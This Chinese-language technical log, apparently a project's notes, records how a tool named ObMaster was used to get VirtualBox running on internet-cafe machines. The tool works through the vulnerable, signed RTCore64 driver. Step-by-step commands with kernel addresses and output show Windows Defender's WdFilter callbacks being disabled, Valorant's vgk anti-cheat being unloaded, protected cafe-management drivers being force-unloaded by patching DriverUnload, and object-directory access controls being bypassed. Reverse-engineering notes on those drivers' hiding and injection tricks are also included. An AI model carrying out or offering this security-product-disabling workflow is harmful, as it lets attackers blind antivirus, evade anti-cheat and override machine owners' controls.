3. **CreateProcess 回调的实际处理**：+0x6fac 的名单来源未逆向完全，若名单包含 VirtualBoxVM.exe，回调可能设置 `CreateInfo->CreationStatus = STATUS_ACCESS_DENIED` 直接阻止进程创建
4. **网吧无盘环境的文件系统限制**：VBox 需要读取磁盘上的 ISO 或 VDI 文件，无盘重定向可能导致文件访问失败
5. **Hypervisor 冲突**：部分网吧管理系统使用 Hyper-V 做环境隔离，与 VBox 的 VT-x 独占冲突

**下一步**：需要在网吧环境（或完整云更新客户端安装状态）下复现，再做针对性分析。

---

## 第二次实战（2026-03-27）

### 环境

- Windows 10 22H2 (build 19045)
- VirtualBox 7.2.6r172322
- 已加载驱动：ksafecenter64.sys, WdFilter.sys, vgk.sys, kshutdown64.sys
- 工具：ObMaster.exe + RTCore64.sys

### 问题现象

```
Exit code: -1073740791 (0xc0000409) STATUS_STACK_BUFFER_OVERRUN
错误: VERR_SUP_VP_FOUND_EVIL_HANDLE (-3738)
```

### 调试步骤

#### 1. 禁用 ksafecenter64 ObCallback

```
[1] Process   Entry:FFFFDD037D307130  Enabled:1  Ops:CREATE
     Pre : FFFFF80597B678B8  ksafecenter64.sys +0x78b8
```

执行：`ObMaster /disable FFFFF80597B678B8`

结果：✅ 成功，但 evil handle 仍然存在

#### 2. 禁用 ksafecenter64 CreateProcess Notify Routine

```
[4] CreateProcess   Slot:6   Block:FFFFB7892FE759F0
     Fn  : FFFFF80597B66FAC  ksafecenter64.sys +0x6fac
```

执行：`ObMaster /ndisable FFFFF80597B66FAC`

结果：✅ evil handle 消失，但出现新错误 0xc0000409

#### 3. 禁用 WdFilter ObCallback 和 LoadImage Notify

```
[0] Process   Pre : FFFFF8055EE1A2A0  WdFilter.sys +0x3a2a0
[1] LoadImage   Fn  : FFFFF8055EE1CE80  WdFilter.sys +0x3ce80
```

执行：
```
ObMaster /disable FFFFF8055EE1A2A0
ObMaster /ndisable FFFFF8055EE1CE80
ObMaster /runas system "net stop WdFilter /y"
```

结果：✅ WdFilter 完全停止

#### 4. 禁用 vgk.sys (Valorant Vanguard)

```
[3] Process   Entry:FFFFDD03793F7640  Enabled:1  Ops:CREATE|DUPLICATE
     Pre : FFFFF80570F5C42C  vgk.sys +0xc42c
```

执行：
```
ObMaster /disable FFFFF80570F5C42C
ObMaster /runas system "net stop vgk /y"
```

结果：✅ vgk 完全停止

#### 5. 禁用 kshutdown64.sys

执行：`ObMaster /runas system "net stop kshutdown /y"`

结果：✅ kshutdown 完全停止

#### 6. 使用 /watchfix 自动修复内存 patch

问题：ntdll.dll .00cfg (CFG) section 被持续修改

执行：
```
ObMaster /watchfix VirtualBoxVM.exe ntdll:.00cfg ntdll:.text VirtualBoxVM.exe:.00cfg
```

结果：
- ✅ 所有内存修改成功修复
- ❌ 进程仍崩溃，错误码变为 0xc0000005 (ACCESS_VIOLATION)
- ❌ Respawn 只到 #1，之前可到 #2

### 根本原因

**ksafecenter64.sys 驱动仍在内存中！**

虽然服务已停止，但驱动代码仍驻留内核，持续 patch 内存：

```
FFFFF80597B60000   ksafecenter64.sys    (无 Running 标志，但仍在内存)
```

Windows 中停止服务 ≠ 卸载驱动。驱动必须显式卸载或重启系统才能清除。

### 解决方案

| 方案 | 描述 | 风险 |
|------|------|------|
| 重启系统 | 彻底清除所有已停止的驱动 | 需要停机 |
| 禁用服务启动类型 | `sc config ksafecenter start=disabled` + 重启 | 需要重启 |
| `/safepatch` 驱动代码 | patch ksafecenter64 入口点让它失效 | BSOD 风险 |

### 经验总结

1. **evil handle 来自 ksafecenter64 的 CreateProcess notify** (+0x6fac)，不是 ObCallback
2. **禁用 notify routine 比 disable ObCallback 更有效**
3. **WdFilter 和 vgk 也需要完全停止**
4. **服务停止 ≠ 驱动卸载** - 这是最后的关键障碍
5. **/watchfix 可以修复内存 patch**，但驱动会持续重新 patch

### 当前状态

- ✅ ksafecenter64 ObCallback: 已禁用
- ✅ ksafecenter64 CreateProcess notify: 已禁用
- ✅ WdFilter: 完全停止
- ✅ vgk: 完全停止
- ✅ kshutdown: 完全停止
- ❌ ksafecenter64.sys 驱动: **仍在内存中**

VirtualBox 仍无法启动，需要重启系统或使用更激进的内核 patch 方法。

---

## ksafecenter64 强制卸载分析（2026-03-27）

### 背景

`sc stop ksafecenter64` 返回错误 1052（`ERROR_INVALID_SERVICE_CONTROL`），
`NtUnloadDriver` 返回 `0xC0000010`（`STATUS_INVALID_DEVICE_REQUEST`）。

驱动一旦加载就无法通过正常手段卸载，典型的流氓网吧驱动行为。

### 二进制分析：DriverUnload 从未设置

使用 `xxd` + `hexdump` 对 `ksafecenter64.sys` 进行二进制静态分析：

**PE 段表：**

| 段 | VA | Size | 文件偏移 |
|----|----|------|---------|
| .text | 0x01000 | 0x09A00 | 0x00400 |
| .rdata | 0x0B000 | 0x01000 | 0x09E00 |
| .data | 0x0C000 | 0x00200 | 0x0AE00 |
| INIT | 0x17000 | 0x00E00 | 0x0B600 |

**EntryPoint stub（INIT 段，RVA 0x17000）：**

```
140017000  mov  [rsp+8], rbx
140017005  push rdi
140017006  sub  rsp, 0x20
14001700A  mov  rbx, rdx
14001700D  mov  rdi, rcx
140017010  call 14001702C      ; 安全 cookie 初始化
140017025  jmp  140001458      ; → 真正的 DriverEntry
```

**真正的 DriverEntry（.text 段，RVA 0x1458，文件偏移 0x858）：**

```
140001458  mov  [rsp+8], rbx
14000146F  mov  ebx, 0xC0000001     ; 默认返回值 = 失败
140001474  xor  esi, esi
140001476  call 140005994           ; 各项初始化...
...
14000151A  lea  rax, [rip+0x67]     ; 默认 IRP 派发函数
140001521  lea  rdi, [rbp+0x70]     ; rbp = DriverObject, +0x70 = MajorFunction[0]
140001525  lea  ecx, [rsi+0x18]     ; 28 个槽位
140001528  rep stosq                 ; 填充所有 MajorFunction
14000152B  lea  rax, [rip+0x56]
140001535  mov  [rbp+0x70], rax     ; IRP_MJ_CREATE
140001539  mov  [rbp+0x80], rax     ; IRP_MJ_CLOSE
140001540  lea  rax, [rip+0x1DD]
140001547  mov  [rbp+0xE0], rax     ; IRP_MJ_DEVICE_CONTROL
; ← 始终没有 mov [rbp+0x68], xxx
140001584  ret
```

**全段扫描结果：**

```bash
# 扫描整个 .text 段（0x9A00 字节）中所有写 [reg+0x68] 的 MOV 指令
# 搜索模式: REX.W(48/49/4C/4D) + 89 + ModRM(mod=01,disp8=0x68)
Total: 0 writes to [reg+0x68]
```

### 根本原因

```
DRIVER_OBJECT + 0x68  =  DriverUnload  =  NULL（从未赋值）

NtUnloadDriver
  └→ IopUnloadDriver
       └→ if (DriverObject->DriverUnload == NULL)
              return STATUS_INVALID_DEVICE_REQUEST;   // 0xC0000010
```

**ksafecenter64 故意不设置 `DriverUnload`，使系统无法通过正常路径卸载它。**
整个 `.text` 段不存在任何向 +0x68 写值的指令，也没有任何函数主动返回 `0xC0000010`（全文扫描 `10 00 00 C0` 字节序列 0 次命中）。

这不是 bug，是设计：加载进来就不想走。

### /force-stop 解决思路

```
1. CmdEnablePriv("SeLoadDriverPrivilege")   ; 内核 token patch，绕过权限限制
2. NtUnloadDriver(...)                       ; 首次调用 → 0xC0000010（预期）
3. AutoFindDriverObject("ksafecenter64")     ; 定位 DRIVER_OBJECT
   ├─ Path 1: 走 PsLoadedModuleList → KLDR  ; 失败（DKOM 已摘链）
   └─ Path 2: 扫描 .data 段找已存指针       ; 失败（ksafecenter64 不保存 DRIVER_OBJECT 指针）
4. FindRetStub()                             ; 在 ntoskrnl .text 找 xor eax,eax; ret
5. Wr64(DRIVER_OBJECT+0x68, retStub)        ; 注入合法的 DriverUnload 指针
6. NtUnloadDriver(...) 重试                  ; IopUnloadDriver 调用 stub → 继续卸载
```

---

## 实测记录（2026-03-27）

### 测试环境

- Windows 10 22H2 build 19045.7058
- ksafecenter64.sys 已加载，DKOM 隐藏（不在 PsLoadedModuleList）
- ObMaster.exe + RTCore64 backend（MSI Afterburner CVE-2019-16098）

### 执行流程

**Step 1：`/force-stop ksafecenter64`**

```
[!] NtUnloadDriver failed: 0xC0000010 STATUS_INVALID_DEVICE_REQUEST
[!] KLDR not in PsLoadedModuleList (DKOM-hidden) — trying .data scan
[!] Scanning .data [0xFFFFF80335DCC000 – 0xFFFFF80335DD5AF4] for DRIVER_OBJECT ptr...
[!] Auto-discovery failed.
```

auto-discovery 两条路都失败：KLDR 被摘链，.data 段也没存 DRIVER_OBJECT 指针。

**Step 2：WinObjEx64 手动取 DRIVER_OBJECT VA**

用 WinObjEx64（以管理员身份运行）导航到 `\Driver\ksafecenter64` → Properties：

```
Object:  0xFFFF800BD67CA750
Header:  0xFFFF800BD67CA720
```

**Step 3：`/drv-unload ksafecenter64 0xFFFF800BD67CA750`**

```
[+] DRIVER_OBJECT signature OK (0x01500004)
[*] DriverUnload (+0x068) = 0x0000000000000000      ← 确认为 NULL
[*] DriverUnload is NULL — patching with ret stub
[+] ret stub found: 0xFFFFF8031C602A54  (xor eax,eax; ret in ntoskrnl)
[+] DriverUnload patched: NULL → 0xFFFFF8031C602A54
[!] OpenService: 5 (ACCESS_DENIED)                  ← SCM 被保护，绕过
```

**Step 4：`/force-stop ksafecenter64`（DriverUnload 已 patch，重试）**

```
[+] SeLoadDriverPrivilege is now active in this process.
[*] NtUnloadDriver("\Registry\Machine\System\CurrentControlSet\Services\ksafecenter64") ...
[+] Driver unloaded successfully
```

**验证：** `/drivers` 显示 `Stopped`，WinObjEx64 的 `\Driver\` 目录中 `ksafecenter64` 条目消失。

### 关键教训

| 问题 | 原因 | 解法 |
|------|------|------|
| auto-discovery 失败 | ksafecenter64 做了 DKOM（摘 KLDR 链），且不在 .data 保存 DRIVER_OBJECT 指针 | WinObjEx64 手动取 VA |
| OpenService ERROR_5 | ksafecenter64 保护自身服务，SC_MANAGER 无法 STOP | 无需 SCM，直接走 NtUnloadDriver |
| kd -kl 无法使用 | 从 Claude Code 子进程无法触发 UAC 弹窗，sudo 无真正提权 | 改用 WinObjEx64 GUI |

### 正确的两步操作流程（DKOM 驱动）

```bash
# 1. 先用 WinObjEx64 取 DRIVER_OBJECT VA（需管理员权限打开）
#    路径: \Driver\<名称> → Properties → Object 字段

# 2. patch DriverUnload
ObMaster.exe /drv-unload <name> <DRIVER_OBJECT_VA>

# 3. 重调 NtUnloadDriver
ObMaster.exe /force-stop <name>
```

---

## 实测记录（2026-03-30）

### 背景

上次（2026-03-27）需要借助 WinObjEx64 手动取 DRIVER_OBJECT VA。
本次新增 `/objdir --kva` 命令，实现全程 ObMaster 自给自足，无需外部工具。

### 测试环境

- Windows 10 22H2 build 19045.7058（重启后全新地址）
- ksafecenter64.sys 已加载，DKOM 隐藏（不在 PsLoadedModuleList）
- ObMaster.exe + RTCore64 backend

### 执行流程

**Step 1：`/force-stop ksafecenter64`（确认失败）**

```
[!] NtUnloadDriver failed: 0xC0000010 STATUS_INVALID_DEVICE_REQUEST
[!] KLDR not in PsLoadedModuleList (DKOM-hidden) — trying .data scan
[!] Auto-discovery failed.
    Use /drv-unload ksafecenter64 <drvobj_va>
```

**Step 2：`/objdir \` — 从根命名空间拿 `\Driver` 目录的 KVA**

```
ObMaster /objdir \
→  Driver   Directory   0xffffcd0dc901c060   0xffffcd0dc901c030
```

`\Driver` 目录无法被用户态 `NtOpenDirectoryObject` 打开（DACL 拒绝），
但 hash bucket 地址已拿到，可直接走内核读。

**Step 3：`/objdir --kva ffffcd0dc901c060` — 绕过 DACL 枚举 `\Driver`**

```
ObMaster /objdir --kva ffffcd0dc901c060
→  ksafecenter64   Driver   0xffffa50e75f0b570   0xffffa50e75f0b540
```

> **⚠️ `/objdir` 输出两列地址说明（重要）：**
> - **第一列** = `DRIVER_OBJECT` 本体 VA（即 `r.objAddr`）→ 用于 `/drv-unload`、`--kill-kva` 等需要 DriverObject 的命令
> - **第二列** = `OBJECT_HEADER` VA（= 第一列 − `OH_SIZE`，即 0x30）→ 仅供参考，通常不直接使用
>
> 例：`0xffffa50e75f0b570`（第一列）才是 `DRIVER_OBJECT`，`0xffffa50e75f0b540`（第二列）是它的 `OBJECT_HEADER`。
> 传给 `--kill-kva` 必须用**第一列**，否则读到的 `DriverStart`/`DriverSize` 是错误值。

DKOM 把 ksafecenter64 从 `PsLoadedModuleList` 摘链，但 Object Directory
hash bucket 只要对象存在就必须在链里，RTCore64 直接读内核内存可以拿到。

**Step 4：`/drv-unload ksafecenter64 ffffa50e75f0b570`（提权运行）**

```
[+] DRIVER_OBJECT signature OK (0x01500004)
[*] DriverUnload (+0x068) = 0x0000000000000000      ← 确认为 NULL
[+] ret stub found: 0xFFFFF80321402A54  (xor eax,eax; ret in ntoskrnl)
[+] DriverUnload patched: NULL → 0xFFFFF80321402A54
[+] Stop accepted — dwCurrentState: 1
[+] Driver is STOPPED
```

**验证：** WinObjEx64 的 `\Driver\` 目录中 `ksafecenter64` 条目消失。

### 对比两次流程

| 步骤 | 2026-03-27 | 2026-03-30 |
|------|------------|------------|
| 取 DRIVER_OBJECT VA | WinObjEx64 GUI（外部工具） | `/objdir \ ` + `/objdir --kva`（自给自足） |
| patch DriverUnload | `/drv-unload` | `/drv-unload` |
| 卸载 | `/force-stop` | 已在 `/drv-unload` 内完成 |

### 关键结论

```
DKOM 能藏：  PsLoadedModuleList → 所有遍历模块列表的工具（包括 WinObjEx64 /drivers 视图）
DKOM 藏不住：\Driver hash bucket → /objdir --kva 直接读内核内存
```

### ⚠️ 适用前提与局限性

**WinObjEx64 和 ObMaster `/objdir` 的本质区别：**

| | WinObjEx64 | ObMaster `/objdir` |
|---|---|---|
| 内核读取依赖 | kldbgdrv（需调试启动）或 wodbgdrv（需驱动签名策略） | RTCore64（CVE-2019-16098，BYOVD） |
| 签名要求 | 需要 Microsoft 签名或测试签名模式 | 利用已签名漏洞驱动，无需特殊签名策略 |
| 地址显示失败的常见原因 | 驱动未加载、无 SeDebugPrivilege、非完整管理员 | RTCore64 被安全软件拦截 IOCTL |

**关键认知：**
- WinObjEx64 地址栏显示为空 ≠ "WinObjEx64 在任何环境下都能用"
- ObMaster `/objdir --kva` 能用的前提是 **RTCore64 能正常收发 IOCTL**
- 两者都失败时，说明内核读取通道本身被封锁，需要换 BYOVD 后端或其他手段
- RTCore64 的适用范围比 WinObjEx64 的驱动宽松很多，但不是万能的

**经验教训（2026-03-30）：**
上次实战发现 WinObjEx64 在目标机上完全看不到任何驱动地址，
事后判断是驱动未正确加载。不能假设 WinObjEx64 在所有环境下都能显示地址。
正确结论：**RTCore64 能跑的地方 ObMaster 就能用；RTCore64 跑不了，两者都没用。**

### 正确的全自动流程（DKOM 驱动，无需外部工具）

```bash
# 1. 从根命名空间找 \Driver 目录 KVA
ObMaster.exe /objdir \
#   记下 Driver 条目的 Object Addr（如 ffffcd0dc901c060）

# 2. 绕过 DACL 枚举 \Driver，找目标驱动 DRIVER_OBJECT VA
ObMaster.exe /objdir --kva <Driver_dir_kva>
#   记下目标驱动的 Object Addr（如 ffffa50e75f0b570）

# 3. patch DriverUnload + sc stop
ObMaster.exe /drv-unload <name> <DRIVER_OBJECT_VA>
```

---

### ⚠️ 为什么不能对 ksafecenter64 使用 `/safepatch`

在此次实战之前曾尝试过 `/safepatch` 方案来 patch ksafecenter64 代码，结果导致多次 BSOD（详见 2026-03-26 BSOD 分析报告）。原因如下：

#### 根因 1：代码页 PTE.Write=0（W^X 保护）

ksafecenter64 的代码页 PTE 没有 Write 位。`/safepatch` 的影子页机制需要先修改 PTE 将目标页变为可写，但：

- 若 MmPteBase 解析失败（返回 0）→ `Rd64(0)` → RTCore64 读地址 0 → **STOP 0x3B ACCESS_VIOLATION**
- 若 PTE 修改时产生 Present=0 竞态窗口 → 其他 CPU 访问该页 → **STOP 0x50 PAGE_FAULT_IN_NONPAGED_AREA**

#### 根因 2：ksafecenter64 的 DKOM 行为干扰 MmPteBase 扫描

ksafecenter64 加载后会修改自身在内核中的可见性（DKOM），导致 `/ptebase` 扫描
ntoskrnl `.data` 引用计数时结果不稳定，无法可靠定位 MmPteBase。

#### 根因 3：驱动代码页属于非分页内存

即使 PTE 修改成功，ksafecenter64 代码在多核环境下仍在运行。
影子页切换瞬间（新 PTE 写入 → TLB 失效广播完成之间）存在不可消除的竞态窗口。

#### 结论

| 方案 | 对 ksafecenter64 是否可用 | 原因 |
|------|--------------------------|------|
| `/patch` | ❌ BSOD | 直接 Wr8 写只读页，STOP 0xBE |
| `/safepatch` | ❌ BSOD 风险高 | PTE 操作 + MmPteBase 不稳定 + 多核竞态 |
| `/drv-unload` + `/objdir --kva` | ✅ 安全 | 绕过 DACL，patch DriverUnload 为 ret stub |

**正确思路：不要试图 patch 一个 DKOM 驱动的代码，直接卸载它。**

---

## 第三次实战（服务器环境，2026-03-30）

### 背景

从本地笔记本切换到真实网吧服务器环境，复现 VBox 无法启动的问题。
本次首次完整分析服务器上 ksafecenter + vgk + kshutdown64 的协同干扰行为。

### 测试环境

- Windows 10 22H2 build 19045（服务器）
- VirtualBox 7.2.6r172322，Ubuntu VM
- 已加载驱动（初始状态）：

| 驱动 | SCM 状态 | 备注 |
|------|---------|------|
| ksafecenter64.sys | 无（zombie） | FFFFF8078FA00000 |
| kshutdown64.sys | 无（loaded，notify 活跃） | 云更新关机组件 |
| kboot64.sys | 无（loaded） | 云更新另一组件 |
| vgk.sys | Running | Valorant Vanguard 反作弊 |
| WdFilter.sys | Running | Windows Defender |
| VBoxSup.sys | Running | |
| RTCore64.sys | Running | 工具后端 |

### 初始状态

VBox 启动失败，exit code `0xC0000409` / `VERR_SUP_VP_FOUND_EVIL_HANDLE (-3738)`，
VBoxHardening.log 记录 evil handle：

```
Found evil handle to budding VM process:
  pid=0x4 (System)  h=0x469e0  acc=0x1fffff
```

exit 时间：**3658 ms**（首次 Respawn#2 创建到 ksafecenter 关闭句柄 + VBoxSup 报错的窗口）。

---

### 阶段 1：枚举并禁用所有 Notify Routines

**发现（`/notify process` / `/notify thread`）：**

| 驱动 | Notify 类型 | 偏移 | 操作 |
|------|------------|------|------|
| vgk.sys | CreateProcess | +0xbee4 | `/ndisable` |
| vgk.sys | CreateThread | +0xd5cc | `/ndisable` |
| kshutdown64.sys | CreateProcess | +0x2ef8 | `/ndisable` |
| WdFilter.sys | CreateProcess | +0x3ce80 | 已在之前会话禁用 |
| WdFilter.sys | CreateThread | +0x3da50 | `/ndisable` |
| WdFilter.sys | CreateThread | +0x3d830 | `/ndisable` |

**执行：**

```
ObMaster /ndisable FFFFF80504XXBEE4   ; vgk process notify
ObMaster /ndisable FFFFF80504XXD5CC   ; vgk thread notify
ObMaster /ndisable FFFFF8074578XXXX   ; kshutdown64 process notify
ObMaster /ndisable FFFFF8073D81DA50   ; WdFilter thread notify [0]
ObMaster /ndisable FFFFF8073D81D830   ; WdFilter thread notify [1]
```

**强制卸载 vgk.sys：**

```
ObMaster /force-stop vgk
→ [+] Driver unloaded successfully
```

kshutdown64 notify 已禁用，驱动仍加载（不影响功能）。

**进展：** exit 时间从 3658ms 延长到 **4135ms**。
VBoxHardening.log：**无任何 evil-handle 行** — VBox 正式通过了 hardening 检查！

---

### 阶段 2：新阻塞 — 0xC0000409 STATUS_STACK_BUFFER_OVERRUN

VBox 不再因 evil handle 失败，但 4135ms 时以 `0xC0000409` 崩溃：

```
supR3HardNtChildWaitFor[1]: Quitting: ExitCode=0xc0000409
   (rcNtWait=0x0, rcNt1=0x0, rcNt2=0x103, rcNt3=0x103, 4135 ms, the end)
```

从 VBoxHardening.log 末尾可见，VBox 已成功加载到音频 DLL 阶段
（msacm32.drv、midimap.dll、MMDevAPI.dll），是子进程直接被外力终止，
而非 VBox 自身 hardening 检查失败。

**0xC0000409 = STATUS_STACK_BUFFER_OVERRUN 通常触发方式：**
- `__security_check_cookie`（GS cookie 真正损坏）
- `RtlFailFast` / `__fastfail` 注入 APC
- 第三方代码调用 `ZwTerminateProcess(hVBox, 0xC0000409)` 伪造崩溃码

---

### 阶段 3：timedelta 确认 System (PID 4) 仍持有 VBox handles

使用 `/timedelta <vboxpid> 5000` 在 VBox 运行窗口内监控 System 进程句柄变化：

```
[+] Handle 0x79BB4 appeared  acc=0x1FFFFF   ← PROCESS_ALL_ACCESS
[+] Handle 0x79CD8 appeared  acc=0x1FFFFF
[+] Handle 0x79CDC appeared  acc=0x1FFFFF
[+] Handle 0x79BF0 appeared  acc=0x102A
[+] Handle 0x79C84 appeared  acc=0x102A
[+] Handle 0x79D0C appeared  acc=0x102A
[-] Handle 0x79BB4 gone      window=4380883 µs  [wide]
[-] Handle 0x79CD8 gone      window=4382626 µs  [wide]
...
```

**关键发现：**

1. **3 个 PROCESS_ALL_ACCESS (0x1FFFFF) 句柄，全程持续 ~4.38 秒**（与 VBox exit 时间完全吻合）
2. 这些句柄对 `NtQuerySystemInformation` **可见** — 不是 `OBJ_KERNEL_HANDLE`
   （与 ksafecenter 早期行为不同：那批是 OBJ_KERNEL_HANDLE，对 NtQSI 不可见）
3. **【后来逆向证伪】** 这些句柄实际上来自 **kshutdown64.sys** 的 APC 注入机制，
   而非 ksafecenter zombie threads（见"阶段 5：kshutdown64 逆向分析"）：
   - kshutdown64 的 CreateProcess 回调 `ZwOpenProcess(DesiredAccess=0x10000000)` 开句柄
   - NtQSI 可见正是因为 ZwOpenProcess 走用户态 handle table
   - 真正杀手是注入的 `kshut64.dll`，通过 `TerminateProcess(self, 0xC0000409)` 终止 VBox

---

### 阶段 4：ksafecenter zombie 分析

`/drv-zombie 0xffffc983340dae30`（DRIVER_OBJECT via `/objdir --kva`）：

```
DRIVER_OBJECT:
    DriverName   : \Driver\ksafecenter
    DriverStart  : 0xFFFFF8078FA00000
    DriverUnload : 0xFFFFF80736402660  ← 指向 ntoskrnl 范围
    Flags        : 0x00000012 (LEGACY INITIALIZED)

DEVICE CHAIN:
    DevObj[0] 0xFFFFC98333F41D50  RefCount=0
    DevObj[1] 0xFFFFC98333F428F0  RefCount=1  ← 有东西在持有引用

VERDICT: [BLOCKED] 2 DeviceObjects 阻止驱动彻底卸载
```

尝试清零 DevObj[1] RefCount（写入 `(obj & 1) == 0x0000000001500003`）：
**写入不粘** — 内核某处在持续持有该引用，反复恢复。

---

### 阶段 5：handle-scan 大量误报 bug 定位与修复

服务器上执行 `/handle-scan 4`：

```
[*] Scan complete — 59348 match(es) found.
```

59,348 个 PROCESS_ALL_ACCESS matches 显然不正确（服务器上没有这么多进程）。

**根因分析：**

HANDLE_TABLE 的 free-list entries（被释放/重用的槽）其 `VolatileLowValue`
不为零（指向链表的 next 指针），且其高位碰巧满足 access mask 过滤条件。
关键区别：**有效 handle entry 的 VolatileLowValue bit 0 = 1（锁定/有效位），
free-list entry 的 bit 0 = 0**。

```
有效条目:  0xA50E76E23090FFFB  (bit 0 = 1 ✓)
空闲条目:  0xxxxxXXXXXXXXXX0  (bit 0 = 0, 被错误计入)
```

**修复（`cmd_handle_close.cpp` WalkHandleTable）：**

```cpp
// 加在所有三个 level 的 obj 读取之后：
if (!(obj & 1)) continue;  // bit 0 = valid/lock bit; 0 = free-list entry
```

**效果：** 59,348 → **441** 真实 matches。

---

### 阶段 6：FindEPROCESS DKOM bypass

`/handle-scan 4 --target-pid <vboxpid> --close` 返回 0 matches。

**根因：**

```
FindEPROCESS(vboxpid) → 走 ActiveProcessLinks 链表 → 找不到 → 返回 0
```

ksafecenter 对 VBox EPROCESS 做了 DKOM：将其从 `ActiveProcessLinks` 链表中摘除。
任何遍历 `ActiveProcessLinks` 的工具（`/proc`、`/handle-scan --target-pid` 等）
对 VBox 都是隐身。

**修复（`kutil.cpp`，`FindEPROCESS` NtQSI fallback）：**

```
FindEPROCESS(pid):
  1. 走 ActiveProcessLinks → 找到则返回（大多数进程）
  2. 未找到 → DKOM-hidden，改走 NtQSI fallback：
       a. OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, pid) → hProc
       b. NtQuerySystemInformation(64=SystemExtendedHandleInformation, ...)
       c. 在 snapshot 中找 {UniqueProcessId=我, HandleValue=hProc}
       d. 返回 Object 字段 = EPROCESS（NtQSI Object 字段直接就是 EPROCESS）
       e. CloseHandle(hProc)
```

**效果：** DKOM-hidden VBox 也能拿到 EPROCESS，`--target-pid` 过滤恢复正常。

---

### 修复验证

两项修复合并提交 `99a0017`，重新 release v1.0.0：

| 修复 | 改动 | 效果 |
|------|------|------|
| valid-bit filter | `cmd_handle_close.cpp` WalkHandleTable 加 `(obj & 1) == 1` | 59348 → 441 真实 matches |
| NtQSI fallback | `kutil.cpp` FindEPROCESS 末尾加 `FindEPROCESS_NtQsi` | DKOM-hidden 进程可正常 --target-pid |

---

### 当前状态与下一步

**已解决：**
- ✅ vgk.sys 完全卸载
- ✅ kshutdown64 / vgk / WdFilter notify routines 全部禁用
- ✅ VBox 通过 hardening 检查（无 evil handle 行）
- ✅ handle-scan false positive 修复
- ✅ FindEPROCESS DKOM bypass 修复

**仍然阻塞：**
- ❌ VBox 在 4135ms 时被 **kshutdown64.sys** 注入的 `kshut64.dll` 以 `0xC0000409` 强制终止（非 ksafecenter）
- ❌ ksafecenter 两个 DeviceObjects 阻止完全卸载，RefCount 清零不粘（次要问题）

**下一步（服务器）：**

```bash
# 下载修复后的 ObMaster
curl -L https://github.com/chen0430tw/ObMaster/releases/download/v1.0.0/ObMaster.exe -o ObMaster.exe

# 验证 false positive 消除
sudo ./ObMaster.exe /quiet /handle-scan 4 2>&1 | tail -3
# 预期: 从 59348 降到 ~几百

# 在 VBox 启动窗口内，用 --target-pid 精确关闭 ksafecenter 对 VBox 的 handles
# (启动 VBox 后立刻执行，在 4135ms 内完成)
sudo ./ObMaster.exe /quiet /handle-scan 4 --target-pid <vboxpid> --close
```

---

### 技术总结

#### ksafecenter 的多层干扰机制（完整图谱）

| 层 | 机制 | 影响 | 已绕过 |
|----|------|------|--------|
| L1 | ObCallback PreOp（ObRegisterCallbacks）| 剥夺外部对受保护进程的权限 | ✅ `/disable` |
| L2 | CreateProcess Notify Routine (+0x6fac) | 从内核打开 OBJ_KERNEL_HANDLE → evil handle | ✅ `/ndisable` |
| L3 | DKOM（ActiveProcessLinks 摘链）| FindEPROCESS 失败，handle-scan 无法过滤 VBox | ✅ NtQSI fallback 修复 |
| L4 | **kshutdown64.sys** APC 注入 kshut64.dll | ~4秒后 TerminateProcess(VBox, 0xC0000409) | 🔄 **隐藏 kshut64.dll 文件** |
| L5 | DeviceObject RefCount 持续恢复（ksafecenter） | zombie driver 无法彻底卸载 | 🔄 根因未定位（次要） |

#### HANDLE_TABLE_ENTRY 有效性判定

```
Win10 19045 HANDLE_TABLE_ENTRY.VolatileLowValue:
  bit 0 = 1  →  有效条目（handle 已分配）
  bit 0 = 0  →  free-list 条目（handle 已释放，high bits = next free ptr）

解码 ObjectPointer（去掉 lock bit + decode）：
  OBJECT_HEADER = (raw >> 16) | 0xFFFF000000000000
  EPROCESS      = OBJECT_HEADER + 0x30
  (已在服务器上验证：System h=0x4 ✓)
```

#### NtQSI EPROCESS 定位（绕过 DKOM）

```
SystemExtendedHandleInformation (class 64):
  SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX.Object = kernel 对象体地址
  对于进程 handle，Object = EPROCESS（直接可用，无需额外偏移计算）

原理：NtQSI 不走 EPROCESS 链表，走全局 handle table；
      DKOM 藏不住 handle table 里的条目。
```

---

## 阶段 5：kshutdown64.sys + kshut64.dll 完整逆向分析（2026-03-30）

### 背景：ksafecenter 无罪，真凶另有其人

静态逆向 `ksafecenter64.sys` 证实其 **没有** `ZwTerminateProcess`、`PsCreateSystemThread`，
不可能主动杀进程。安装包中另一个驱动 `kshutdown64.sys` 导入了：
- `PsSetCreateProcessNotifyRoutine`
- `KeInitializeApc` / `KeInsertQueueApc`
- `ZwOpenProcess` / `ZwAllocateVirtualMemory`
- `MmGetSystemRoutineAddress`

这是典型的**内核 APC 注入**驱动特征。

---

### kshutdown64.sys 攻击链总览

```
kshutdown64.sys 加载（DriverEntry +0x3388）
│
├─ ZwAllocateVirtualMemory(handle=-1, size=0x260, PAGE_EXECUTE_READWRITE)
│    └─ payload+0x90 = UNICODE_STRING L"kshut64.dll"（64位）/ L"kshut.dll"（32位）
│
├─ PsSetCreateProcessNotifyRoutine(callback=+0x1D3C)
│
└─ [每当有进程创建时] CreateProcess 回调（+0x1D3C）
     │
     ├─ PsLookupProcessByProcessId → 取 EPROCESS
     ├─ GetImageFileName(EPROCESS+0x5C) → 进程名
     ├─ 对比白名单（clsmn.exe / pubwinclient.exe / explorer.exe / ...）
     │
     ├─ [在白名单] → 放行，exit
     │
     └─ [不在白名单，如 VBoxSVC.exe] ──────────────────────────┐
                                                               ↓
                                          ZwOpenProcess(VBox, 0x10000000)
                                               ↓
                                          找 VBox 线程 ETHREAD
                                               ↓
                                          KeInitializeApc(apc, thread,
                                            KernelRoutine, NULL,
                                            NormalRoutine=LdrLoadDll,
                                            UserMode, arg=payload)
                                               ↓
                                          KeInsertQueueApc(apc)
                                          ↑ 注：通过函数指针表调用
                                            [call qword ptr [rsi]]
                                            [call qword ptr [rsi+8]]
                                            （不走直接 IAT，绕过简单扫描）
                                               ↓
                              [VBox 线程返回用户态，APC 触发]
                                               ↓
                                     LdrLoadDll("kshut64.dll")
                                               ↓
                                    kshut64.dll DllMain 执行
                                               ↓
                                SetUnhandledExceptionFilter(NULL)
                                               ↓
                                    GetCurrentProcess()
                                               ↓
                              TerminateProcess(self, 0xC0000409)
                                               ↓
                         VBox 以 STATUS_STACK_BUFFER_OVERRUN 退出
                         （伪装成 /GS security cookie 失败）
```

---

### kshutdown64.sys 攻击链（静态逆向确认）

#### 1. DriverEntry（+0x3388）

```
call +0x1A20   → 初始化（读注册表配置、superadmin 密码等）
call +0x17EC   → 检查平台版本
